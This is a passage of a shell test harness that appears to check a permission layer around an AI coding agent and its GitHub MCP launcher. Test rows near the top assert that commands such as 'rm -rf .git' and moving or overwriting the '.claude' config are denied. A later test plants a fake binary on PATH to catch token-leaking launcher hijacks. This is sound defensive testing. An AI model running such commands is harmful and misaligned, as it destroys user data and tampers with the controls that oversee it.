gsf P2 "mv .claude /tmp/x" deny 'mv .claude /tmp/x'
gsf P2 "cp -R /tmp/e/ .claude/" deny 'cp -R /tmp/e/ .claude/'
gsf P2 "rm -rf .git (holds .git/hooks and .git/config)" deny 'rm -rf .git'
gsf P2 "rm -rf .tamirs-superpowers" deny 'rm -rf .tamirs-superpowers'

# =========================================================================================
section "L1: the GitHub MCP launcher never takes its binary from PATH"
# =========================================================================================
R13="$(new_root)"; FAKEPATH="$(harness_tmpdir)"; MARK="$(harness_tmpdir)"
printf '#!/bin/sh\necho "path-binary ${GITHUB_PERSONAL_ACCESS_TOKEN:+token}" > "%s/ran"\n' "$MARK" > "$FAKEPATH/github-mcp-server"
chmod 755 "$FAKEPATH/github-mcp-server"
if [ -f "$MCP" ]; then
  (cd "$NOWHERE" && TAMIRS_PERMISSION_TEST_ROOT="$R13" PATH="$FAKEPATH:$PATH" GITHUB_PERSONAL_ACCESS_TOKEN=t bash "$MCP" </dev/null >/dev/null 2>&1)
  row L1 "a github-mcp-server first on PATH never runs with the token" "$([ -e "$MARK/ran" ] && echo no || echo yes)" "$(cat "$MARK/ran" 2>/dev/null)"
else
  row L1 "a github-mcp-server first on PATH never runs with the token" no "missing: $MCP"
fi

# =========================================================================================
section "the real config and state dirs were never touched"
# =========================================================================================
judge "real-home witness unchanged" "$REAL_BEFORE" "$(witness)"

section "rows by finding"
for id in F1 F2 F3 F4a F4b F4c F4d F5 F6 F7 F8 F9 F10 P1 P2 L1; do
  p="$(awk -F'\t' -v i="$id" '$1 == i && $2 == "pass"' "$ROWS" | wc -l | tr -d ' ')"
  f="$(awk -F'\t' -v i="$id" '$1 == i && $2 == "fail"' "$ROWS" | wc -l | tr -d ' ')"
  printf '  %-4s %3s pass %3s fail\n' "$id" "$p" "$f"
done
printf '  all  %3s pass %3s fail\n' "$(awk -F'\t' '$2 == "pass"' "$ROWS" | wc -l | tr -d ' ')" "$(awk -F'\t' '$2 == "fail"' "$ROWS" | wc -l | tr -d ' ')"

harness_summary
